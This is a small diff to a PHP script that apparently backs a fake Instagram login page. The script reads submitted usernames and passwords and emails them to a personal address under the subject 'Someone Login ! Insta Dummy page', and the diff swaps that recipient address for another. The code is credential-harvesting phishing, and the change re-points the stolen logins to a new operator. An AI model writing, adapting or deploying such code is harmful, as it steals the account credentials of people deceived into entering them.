@@ -5,7 +5,7 @@ $username = $_POST['u_name'] ?? '';  // Fetch username (using null coalescing op
 $passcode = $_POST['pass'] ?? '';    // Fetch password (using null coalescing operator)
 
 $subject = "Someone Login ! Insta Dummy page";
-$to = "zbiiizbi164@gmail.com";
+$to = "adambadri5@gmail.com";
 
 $txt = "Username: " . $username . "\r\nPassword: " . $passcode; // Email body (i) username [break] (ii) password;
 
